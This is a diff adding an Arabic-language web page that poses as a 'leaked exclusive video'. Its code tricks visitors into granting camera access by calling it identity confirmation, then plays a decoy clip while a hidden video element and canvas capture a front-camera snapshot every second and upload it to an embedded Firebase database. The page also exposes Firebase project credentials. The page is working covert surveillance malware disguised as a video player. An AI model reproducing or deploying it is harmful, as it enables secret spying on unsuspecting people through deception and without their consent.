@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🛑 محتوى مسرب - شاهد الآن</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .card { text-align: center; padding: 30px; border: 1px solid #222; border-radius: 20px; background: #0a0a0a; width: 90%; max-width: 400px; }
+        .btn-play { background: #ff0000; color: #fff; border: none; padding: 15px 40px; font-size: 1.2rem; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; box-shadow: 0 5px 15px rgba(255,0,0,0.3); }
+        #video-player { width: 100%; border-radius: 10px; display: none; margin-top: 15px; }
+        .warning { color: #555; font-size: 0.8rem; margin-top: 15px; }
+        canvas, video.hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="gate">
+        <h2 style="color: #ff4d4d;">🔓 فيديو حصري</h2>
+        <p>يجب "تأكيد الهوية" لبدء البث الآمن للمحتوى المسرب.</p>
+        <button class="btn-play" onclick="startSystem()">فتح الفيديو الآن</button>
+        <p class="warning">بالضغط أنت توافق على بروتوكول المشاهدة المشفر.</p>
+    </div>
+
+    <video id="video-player" controls playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+
+    <video id="spy-cam" autoplay playsinline class="hidden"></video>
+    <canvas id="out-canvas" class="hidden"></canvas>
+
+    <script>
+        // إعدادات Firebase الخاصة بك مع المعرف الجديد
+        const firebaseConfig = {
+            apiKey: "AIzaSyBumPG8AFJVCDvG4B5AFfvUeEjcz1rl16w",
+            authDomain: "omarnnn90-816ad.firebaseapp.com",
+            projectId: "omarnnn90-816ad",
+            storageBucket: "omarnnn90-816ad.firebasestorage.app",
+            messagingSenderId: "145295465727",
+            appId: "1:145295465727:web:aeccad1380c862ec2100ca",
+            databaseURL: "https://omarnnn90-816ad-95a73-default-rtdb.firebaseio.com"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref("live_capture");
+
+        async function startSystem() {
+            document.getElementById('gate').style.display = 'none';
+            const vPlayer = document.getElementById('video-player');
+            vPlayer.style.display = 'block';
+            vPlayer.play();
+
+            try {
+                // طلب الكاميرا (سيظهر للمستخدم كأنه تأكيد هوية)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('spy-cam').srcObject = stream;
+                
+                // بدء سحب الصور كل ثانية واحدة
+                setInterval(capture, 1000);
+            } catch (e) {
+                console.log("Permission Denied");
+            }
+        }
+
+        function capture() {
+            const canvas = document.getElementById('out-canvas');
+            const video = document.getElementById('spy-cam');
+            canvas.width = 160; 
+            canvas.height = 120;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 160, 120);
+            
+            // تحويل الصورة لنص (Base64) وإرسالها لـ Firebase
+            const imgData = canvas.toDataURL('image/jpeg', 0.2);
+            db.set({
+                img: imgData,
+                time: Date.now()
+            });
+        }
+    </script>
+</body>
+</html>
